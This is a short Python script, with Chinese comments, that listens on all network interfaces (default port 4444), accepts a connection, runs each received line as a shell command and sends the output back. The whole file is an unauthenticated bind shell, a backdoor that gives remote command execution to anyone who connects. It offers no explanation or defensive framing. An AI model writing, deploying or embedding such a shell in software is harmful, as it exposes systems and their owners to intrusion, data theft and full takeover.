import socket
import subprocess
import click

def run_cmd(cmd):
    # 执行命令，同时捕获标准输出和错误输出
    output = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    return output.stdout + output.stderr

@click.command()
@click.option('--port', '-p', default=4444, help='Port to listen on')
def main(port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # 允许端口重用，避免重启报错
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', port)) 
    s.listen(4)
    print(f'[*] Listening on 0.0.0.0:{port}')

    # 等待宿主机连接
    client_socket, address = s.accept()
    print(f'[*] Connection from {address}')

    while True:
        chunks = []
        chunk = client_socket.recv(2048) 
        chunks.append(chunk)

      
        while len(chunk) != 0 and chr(chunk[-1]) != '\n':
            chunk = client_socket.recv(2048)
            chunks.append(chunk)

        cmd = (b''.join(chunks)).decode(errors='ignore').strip()
        
        if cmd.lower() == 'exit':
            client_socket.close()
            break
        if not cmd:
            continue
            
        # 执行命令并回传结果
        output = run_cmd(cmd)
        client_socket.sendall(output)

    s.close()

if __name__ == '__main__':
    main()
